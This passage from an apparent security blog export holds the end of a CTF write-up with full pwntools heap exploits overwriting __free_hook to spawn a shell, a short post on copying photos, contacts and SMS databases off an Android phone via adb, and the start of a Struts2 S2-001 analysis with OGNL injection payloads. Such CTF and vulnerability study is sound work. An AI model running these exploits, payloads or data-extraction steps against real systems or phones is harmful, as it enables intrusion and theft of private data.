ma_a<span class="token operator">=</span>int<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">96</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>ma_a<span class="token punctuation">)</span><span class="token punctuation">)</span>
ma_o<span class="token operator">=</span><span class="token number">0x3ebc40</span>
lib_b<span class="token operator">=</span>ma_a<span class="token operator">-</span>ma_o
fh_a<span class="token operator">=</span>lib_b<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>fh_a<span class="token punctuation">)</span><span class="token punctuation">)</span>
sys_a<span class="token operator">=</span>lib_b<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>

rm<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>cyclic<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fh_a<span class="token number">-8</span><span class="token punctuation">)</span><span class="token operator">+</span>cyclic<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>sys_a<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>

rm<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>



c<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/pwn1.png" alt="å›¾ç‰‡"></p>
<h3 id="youchatã€å·²è§£å†³ã€‘"><a href="#youchatã€å·²è§£å†³ã€‘" class="headerlink" title="youchatã€å·²è§£å†³ã€‘"></a>youchatã€å·²è§£å†³ã€‘</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>



LOCAL <span class="token operator">=</span> <span class="token boolean">False</span>
binfile<span class="token operator">=</span><span class="token string">'./youchat'</span>
libcfile<span class="token operator">=</span><span class="token string">'./libc-2.27.so'</span>
offset<span class="token operator">=</span><span class="token number">0</span>



e<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binfile<span class="token punctuation">)</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'info'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span>e<span class="token punctuation">.</span>arch
<span class="token keyword">if</span> context<span class="token punctuation">.</span>arch<span class="token operator">==</span><span class="token string">'i386'</span><span class="token punctuation">:</span>
    x86<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    x86<span class="token operator">=</span><span class="token boolean">False</span>

<span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
    c <span class="token operator">=</span> process<span class="token punctuation">(</span>binfile<span class="token punctuation">)</span>
    <span class="token keyword">if</span> libcfile<span class="token punctuation">:</span>
        libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span>libcfile<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> x86<span class="token punctuation">:</span>
            libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    c <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'124.70.158.59'</span><span class="token punctuation">,</span><span class="token number">30023</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> libcfile<span class="token punctuation">:</span>
        libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span>libcfile<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>name<span class="token punctuation">,</span>pword<span class="token punctuation">)</span><span class="token punctuation">:</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ce: '</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'How long is your user id: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'User name: '</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Password: '</span><span class="token punctuation">,</span>pword<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ce: '</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ce: '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'New username: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ce: '</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Username: '</span><span class="token punctuation">)</span>

s<span class="token operator">=</span><span class="token string">'/bin/sh;'</span>
size<span class="token operator">=</span><span class="token number">0x88</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  add<span class="token punctuation">(</span>i<span class="token punctuation">,</span>size<span class="token punctuation">,</span>s<span class="token punctuation">,</span>s<span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>size<span class="token punctuation">,</span>s<span class="token punctuation">,</span>s<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  rm<span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">-</span>i<span class="token punctuation">)</span>

rm<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>





<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  add<span class="token punctuation">(</span>i<span class="token punctuation">,</span>size<span class="token punctuation">,</span>s<span class="token punctuation">,</span>s<span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>size<span class="token punctuation">,</span>s<span class="token punctuation">,</span>s<span class="token punctuation">)</span>

view<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
ma_a<span class="token operator">=</span>int<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">96</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'ma_a: '</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>ma_a<span class="token punctuation">)</span><span class="token punctuation">)</span>
ma_o<span class="token operator">=</span><span class="token number">0x3ebc40</span>
lib_b<span class="token operator">=</span>ma_a<span class="token operator">-</span>ma_o
fh_a<span class="token operator">=</span>lib_b<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'fh_a: '</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>fh_a<span class="token punctuation">)</span><span class="token punctuation">)</span>
sys_a<span class="token operator">=</span>lib_b<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>

offset<span class="token operator">=</span><span class="token number">0x20</span>

rm<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>size<span class="token punctuation">,</span>s<span class="token punctuation">,</span>cyclic<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>



rm<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>cyclic<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fh_a<span class="token punctuation">)</span><span class="token punctuation">)</span>



add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>size<span class="token punctuation">,</span>s<span class="token punctuation">,</span>s<span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>size<span class="token punctuation">,</span>s<span class="token punctuation">,</span>s<span class="token punctuation">)</span>



edit<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>sys_a<span class="token punctuation">)</span><span class="token punctuation">)</span>

rm<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>

c<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>é€šè¿‡adbè·å–éšç§ä¿¡æ¯</title>
    <url>/2020/12/07/tong-guo-adb-huo-qu-yin-si-xin-xi/</url>
    <content><![CDATA[<blockquote>
<p>ä¸»è¦æµ‹è¯•äº†å¯¹äºç…§ç‰‡å’Œé€šè®¯å½•ã€çŸ­ä¿¡çš„ä¸€äº›æ“ä½œï¼Œå½“ç„¶è¿˜æœ‰å…¶ä»–çš„æ”»å‡»æˆ–ä¿¡æ¯è·å–æ–¹å¼ï¼Œä¹‹åå®ç°äº†å†æ¥æ›´æ–°æ€»ç»“ã€‚</p>
<p>ä¸»è¦æ˜¯ç›®å‰å·¥ä½œé‡åˆ°é—®é¢˜çš„ä¸€äº›æ€»ç»“å’Œè®°å½•ï¼Œä¹‹åå·¥ä½œä¸­å†è¡¥å……ã€‚</p>
</blockquote>
<h1 id="é€šè¿‡adbè·å–éšç§ä¿¡æ¯"><a href="#é€šè¿‡adbè·å–éšç§ä¿¡æ¯" class="headerlink" title="é€šè¿‡adbè·å–éšç§ä¿¡æ¯"></a>é€šè¿‡adbè·å–éšç§ä¿¡æ¯</h1><p>å‰ææ¡ä»¶æ˜¯æ‰‹æœºå¼€å¯äº†adbè°ƒè¯•ï¼Œæ”»å‡»çš„è¿‡ç¨‹éƒ½æ˜¯é€šè¿‡adbè¿›è¡Œçš„ã€‚</p>
<blockquote>
<p>æµ‹è¯•æ‰‹æœºæ˜¯åä¸ºP9ã€‚</p>
<p>æˆ‘çš„æ‰‹æœºè™½ç„¶rootçš„ä½†æ˜¯æ²¡åŠæ³•æ‰§è¡Œ <code>adb shell</code>ï¼ŒæŸ¥äº†ä¸€ä¸‹è²Œä¼¼æœ‰çš„æ‰‹æœºæ˜¯ä¼šè¿™æ ·ï¼Œä¸‰æ˜Ÿä¹Ÿå¸¸é‡åˆ°ã€‚</p>
<p>è§£å†³æ–¹å¼æœ‰æåˆ°ä½¿ç”¨ <code>adbd Insecure</code> æ¥ä½¿adb shellå˜æˆroot shellçš„ï¼Œä½†æ˜¯æˆ‘çš„è®¾å¤‡åœ¨ä½¿ç”¨è¿™ç§æ–¹æ³•åä¼šadbè¯†åˆ«ä¸åˆ°è®¾å¤‡ï¼Œæš‚æ—¶æ²¡æ‰¾åˆ°åŸå› .</p>
</blockquote>
<h2 id="è·å–ç…§ç‰‡ä¿¡æ¯"><a href="#è·å–ç…§ç‰‡ä¿¡æ¯" class="headerlink" title="è·å–ç…§ç‰‡ä¿¡æ¯"></a>è·å–ç…§ç‰‡ä¿¡æ¯</h2><p>è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œä¸»è¦å‡ ä¸ªç‚¹ï¼š</p>
<ul>
<li>ç›¸å†Œç›®å½•ï¼š<code>/sdcard/DCIM</code>ï¼Œä¸€èˆ¬æ‰‹æœºæ‹çš„ç…§ç‰‡éƒ½ä¿å­˜åœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼Œæˆ‘çš„æ‰‹æœºæ‹æ‘„ç…§ç‰‡ç›®å½•æ˜¯ï¼š<code>/sdcard/DCIM/Camera</code></li>
<li>ä½¿ç”¨adb pull æ‹‰å–ç…§ç‰‡</li>
</ul>
<h2 id="è·å–è”ç³»äºº"><a href="#è·å–è”ç³»äºº" class="headerlink" title="è·å–è”ç³»äºº"></a>è·å–è”ç³»äºº</h2><p>è”ç³»äººçš„ä¿¡æ¯å­˜åœ¨ä¸€ä¸ªcontacts2.dbçš„æ•°æ®åº“ä¸­ï¼Œä¸»è¦æ˜¯å–è·å–è¯¥æ–‡ä»¶</p>
<ul>
<li>è·¯å¾„ï¼š<code>/data/data/com.android.providers.contacts/databases/contacts2.db</code></li>
<li>adb pullçš„æ—¶å€™çš„æƒé™é—®é¢˜</li>
<li>å¯¹åº”çš„æ–‡ä»¶æ˜¯ä¸ªsqliteæ•°æ®åº“ï¼Œè¿™é‡Œæ¢³ç†ä¸€ä¸‹è·å–è”ç³»äººè®°å½•éœ€è¦æŸ¥æ‰¾çš„å‡ ä¸ªè¡¨ï¼šcontactsè¡¨ã€dataè¡¨ï¼›</li>
<li>è¦å…ˆè¯»å–contactsè¡¨ï¼Œname_raw_contact_idï¼›ä¸€ä¸ªname_raw_contact_idå¯¹åº”ä¸€ä¸ªè”ç³»äººï¼Œå†ç”¨raw_contact_idå»dataè¡¨ä¸­æŸ¥å¯¹åº”çš„æ•°æ®</li>
</ul>
<h2 id="è·å–çŸ­ä¿¡ä¿¡æ¯"><a href="#è·å–çŸ­ä¿¡ä¿¡æ¯" class="headerlink" title="è·å–çŸ­ä¿¡ä¿¡æ¯"></a>è·å–çŸ­ä¿¡ä¿¡æ¯</h2><p>ç±»ä¼¼è”ç³»äºº</p>
<ul>
<li>æ™®éçš„è·¯å¾„æ˜¯ï¼š<code>/data/data/com.android.providers.telephony/databases/mmssms.db</code></li>
<li>æˆ‘æµ‹è¯•æ—¶å€™çš„è·¯å¾„æ˜¯ï¼š<code>/data/data/com.android.messaging/databases/bugle_db</code>ï¼Œåœ¨æˆ‘çŸ­ä¿¡åº”ç”¨çš„åŒ…åçš„æ–‡ä»¶å¤¹ä¸‹</li>
<li>ä¸»è¦å†…å®¹åœ¨ conversations è¡¨</li>
</ul>
<h2 id="ä¿®æ”¹å†…å®¹"><a href="#ä¿®æ”¹å†…å®¹" class="headerlink" title="ä¿®æ”¹å†…å®¹"></a>ä¿®æ”¹å†…å®¹</h2><p>æ ¹æ®ä¹‹å‰çš„å„ä¸ªè¡¨çš„å­—æ®µå…³ç³»è¿›è¡Œä¿®æ”¹å°±å¯ä»¥äº†ã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/adb-attack/Screenshot_20201206-165409.png" alt=""></p>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>adb</tag>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWebå®‰å…¨å…¥é—¨ä¹‹ S2-001æ¼æ´åˆ†æ</title>
    <url>/2020/12/15/s2-001-lou-dong-fen-xi/</url>
    <content><![CDATA[<blockquote>
<p>è·Ÿç€å¤§ä½¬ä»¬çš„åšå®¢ï¼Œå¼€å§‹ç¬¬ä¸€ç¯‡æ¼æ´åˆ†æè®°å½•ï¼Œè®°å½•æ¼æ´å¤ç°åˆ†æè¿‡ç¨‹ï¼Œå·²ç»è¸©åˆ°çš„å‘ï¼Œå¼€å§‹å…¥å‘Java Webå®‰å…¨ï¼Œè¡¥è¶³è‡ªå·±çš„ä¸è¶³ã€‚</p>
</blockquote>
<h2 id="1-æ¼æ´ç®€ä»‹"><a href="#1-æ¼æ´ç®€ä»‹" class="headerlink" title="1-æ¼æ´ç®€ä»‹"></a>1-æ¼æ´ç®€ä»‹</h2><p>å®˜æ–¹å…¬å‘Šï¼š<a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
<p>æ¼æ´å½±å“èŒƒå›´ï¼šWebWork 2.2.0-WebWork 2.2.5ï¼ŒStruts 2.0.0-Struts 2.0.8</p>
<h2 id="2-Struts2-æ¶æ„-amp-è¯·æ±‚å¤„ç†æµç¨‹"><a href="#2-Struts2-æ¶æ„-amp-è¯·æ±‚å¤„ç†æµç¨‹" class="headerlink" title="2-Struts2 æ¶æ„&amp;è¯·æ±‚å¤„ç†æµç¨‹"></a>2-Struts2 æ¶æ„&amp;è¯·æ±‚å¤„ç†æµç¨‹</h2><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16077762148742.jpg" alt=""></p>
<p>åœ¨è¯¥å›¾ä¸­ï¼Œä¸€å…±ç»™å‡ºäº†å››ç§é¢œè‰²çš„æ ‡è¯†ï¼Œå…¶å¯¹åº”çš„æ„ä¹‰å¦‚ä¸‹ã€‚</p>
<ul>
<li>Servlet Filters(æ©™è‰²)ï¼šè¿‡æ»¤å™¨ï¼Œæ‰€æœ‰çš„è¯·æ±‚éƒ½è¦ç»è¿‡è¿‡æ»¤å™¨çš„å¤„ç†ã€‚</li>
<li>Struts Core(æµ…è“è‰²)ï¼šStruts2çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚</li>
<li>Interceptors(æµ…ç»¿è‰²)ï¼šStruts2çš„æ‹¦æˆªå™¨ã€‚</li>
<li>User created(æµ…é»„è‰²)ï¼šéœ€è¦å¼€å‘äººå‘˜åˆ›å»ºçš„éƒ¨åˆ†ã€‚</li>
</ul>
<p>å›¾ä¸­çš„ä¸€äº›ç»„ä»¶çš„ä½œç”¨å¦‚ä¸‹ï¼š</p>
<ul>
<li>FilterDispatcherï¼šæ˜¯æ•´ä¸ªStruts2çš„è°ƒåº¦ä¸­å¿ƒï¼Œä¹Ÿå°±æ˜¯æ•´ä¸ªMVCæ¶æ„ä¸­çš„Cï¼Œå®ƒæ ¹æ®ActionMapperçš„ç»“æœæ¥å†³å®šæ˜¯å¦å¤„ç†è¯·æ±‚ã€‚</li>
<li>ActionMapperï¼šç”¨æ¥åˆ¤æ–­ä¼ å…¥çš„è¯·æ±‚æ˜¯å¦è¢«Struts2å¤„ç†ï¼Œå¦‚æœéœ€è¦å¤„ç†çš„è¯ï¼ŒActionMapperå°±ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡æ¥æè¿°è¯·æ±‚å¯¹åº”çš„ActionInvocationçš„ä¿¡æ¯ã€‚</li>
<li>ActionProxyï¼šç”¨æ¥åˆ›å»ºä¸€ä¸ªActionInvocationä»£ç†å®ä¾‹ï¼Œå®ƒä½äºActionå’Œxworkä¹‹é—´ã€‚</li>
<li>ConfigurationManagerï¼šæ˜¯xworké…ç½®çš„ç®¡ç†ä¸­å¿ƒï¼Œå¯ä»¥æŠŠå®ƒå½“åšå·²ç»è¯»å–åˆ°å†…å­˜ä¸­çš„struts.xmlé…ç½®æ–‡ä»¶ã€‚</li>
<li>struts.xmlï¼šæ˜¯Stuts2çš„åº”ç”¨é…ç½®æ–‡ä»¶ï¼Œè´Ÿè´£è¯¸å¦‚URLä¸Actionä¹‹é—´æ˜ å°„çš„é…ç½®ã€ä»¥åŠæ‰§è¡Œåé¡µé¢è·³è½¬çš„Resulté…ç½®ç­‰ã€‚</li>
<li>ActionInvocationï¼šç”¨æ¥çœŸæ­£çš„è°ƒç”¨å¹¶æ‰§è¡ŒActionã€æ‹¦æˆªå™¨å’Œå¯¹åº”çš„Resultï¼Œä½œç”¨ç±»ä¼¼äºä¸€ä¸ªè°ƒåº¦å™¨ã€‚</li>
<li>Interceptorï¼šæ‹¦æˆªå™¨ï¼Œå¯ä»¥è‡ªåŠ¨æ‹¦æˆªActionï¼Œä¸»è¦åœ¨Actionè¿è¡Œä¹‹å‰æˆ–è€…Resultè¿è¡Œä¹‹åæ¥è¿›è¡Œæ‰§è¡Œï¼Œå¼€å‘è€…å¯ä»¥è‡ªå®šä¹‰ã€‚</li>
<li>Actionï¼šæ˜¯Struts2ä¸­çš„åŠ¨ä½œæ‰§è¡Œå•å…ƒã€‚ç”¨æ¥å¤„ç†ç”¨æˆ·è¯·æ±‚ï¼Œå¹¶å°è£…ä¸šåŠ¡æ‰€éœ€è¦çš„æ•°æ®ã€‚</li>
<li>Resultï¼šæ˜¯ä¸åŒè§†å›¾ç±»å‹çš„æŠ½è±¡å°è£…æ¨¡å‹ï¼Œä¸åŒçš„è§†å›¾ç±»å‹ä¼šå¯¹åº”ä¸åŒçš„Resultå®ç°ï¼ŒStruts2ä¸­æ”¯æŒå¤šç§è§†å›¾ç±»å‹ï¼Œæ¯”å¦‚Jspï¼ŒFreeMarkerç­‰ã€‚</li>
<li>Templatesï¼šå„ç§è§†å›¾ç±»å‹çš„é¡µé¢æ¨¡æ¿ï¼Œæ¯”å¦‚JSPå°±æ˜¯ä¸€ç§æ¨¡æ¿é¡µé¢æŠ€æœ¯ã€‚</li>
<li>Tag Subsystemï¼šStruts2çš„æ ‡ç­¾åº“ï¼Œå®ƒæŠ½è±¡äº†ä¸‰ç§ä¸åŒçš„è§†å›¾æŠ€æœ¯JSPã€velocityã€freemarkerï¼Œå¯ä»¥åœ¨ä¸åŒçš„è§†å›¾æŠ€æœ¯ä¸­ï¼Œå‡ ä¹æ²¡æœ‰å·®åˆ«çš„ä½¿ç”¨è¿™äº›æ ‡ç­¾ã€‚</li>
</ul>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥ç»“åˆä¸Šå›¾ï¼Œæ¥äº†è§£ä¸‹Struts2æ¡†æ¶æ˜¯å¦‚ä½•å¤„ç†ä¸€ä¸ªHTTPè¯·æ±‚çš„ã€‚</p>
<p>å½“HTTPè¯·æ±‚å‘é€ä¸ªWebæœåŠ¡å™¨ä¹‹åï¼ŒWebæœåŠ¡å™¨æ ¹æ®ç”¨æˆ·çš„è¯·æ±‚ä»¥åŠ <code>web.xml</code> ä¸­çš„é…ç½®æ–‡ä»¶ï¼Œå°†è¯·æ±‚è½¬å‘ç»™ <code>Struts2</code> æ¡†æ¶è¿›è¡Œå¤„ç†ã€‚</p>
<ol>
<li>HTTPè¯·æ±‚ç»è¿‡ä¸€ç³»åˆ—çš„è¿‡æ»¤å™¨ï¼Œæœ€ååˆ°è¾¾ <code>FilterDispatcher</code> è¿‡æ»¤å™¨ã€‚</li>
<li><code>FilterDispatcher</code> å°†è¯·æ±‚è½¬å‘ <code>ActionMapper</code>ï¼Œåˆ¤æ–­è¯¥è¯·æ±‚æ˜¯å¦éœ€è¦å¤„ç†ã€‚</li>
<li>å¦‚æœè¯¥è¯·æ±‚éœ€è¦å¤„ç†ï¼Œ<code>FilterDispatcher</code>ä¼šåˆ›å»ºä¸€ä¸ª <code>ActionProxy</code> æ¥è¿›è¡Œåç»­çš„å¤„ç†ã€‚</li>
<li><code>ActionProxy</code> æ‹¿ç€HTTPè¯·æ±‚ï¼Œè¯¢é—® <code>struts.xml</code> è¯¥è°ƒç”¨å“ªä¸€ä¸ª <code>Action</code> è¿›è¡Œå¤„ç†ã€‚</li>
<li>å½“çŸ¥é“ç›®æ ‡<code>Action</code>ä¹‹åï¼Œå®ä¾‹åŒ–ä¸€ä¸ª<code>ActionInvocation</code>æ¥è¿›è¡Œè°ƒç”¨ã€‚</li>
<li>ç„¶åè¿è¡Œåœ¨<code>Action</code>ä¹‹å‰çš„æ‹¦æˆªå™¨ï¼Œå›¾ä¸­å°±æ˜¯æ‹¦æˆªå™¨1ã€2ã€3ã€‚</li>
<li>è¿è¡Œ<code>Action</code>ï¼Œç”Ÿæˆä¸€ä¸ª<code>Result</code>ã€‚</li>
<li><code>Result</code>æ ¹æ®é¡µé¢æ¨¡æ¿å’Œæ ‡ç­¾åº“ï¼Œç”Ÿæˆè¦å“åº”çš„å†…å®¹ã€‚</li>
<li>æ ¹æ®å“åº”é€†åºè°ƒç”¨æ‹¦æˆªå™¨ï¼Œç„¶åç”Ÿæˆæœ€ç»ˆçš„å“åº”å¹¶è¿”å›ç»™WebæœåŠ¡å™¨ã€‚</li>
</ol>
<h2 id="3-æ¼æ´å¤ç°"><a href="#3-æ¼æ´å¤ç°" class="headerlink" title="3-æ¼æ´å¤ç°"></a>3-æ¼æ´å¤ç°</h2><p>1ã€è·å–tomcatè·¯å¾„</p>
<pre><code>%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16077772939716.jpg" alt=""></p>
<p>2ã€è·å–webç›®å½•</p>
<pre><code>%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;/&#39;)),#response.flush(),#response.close()}</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16077773498970.jpg" alt=""></p>
<p>3ã€æ‰§è¡Œå‘½ä»¤</p>
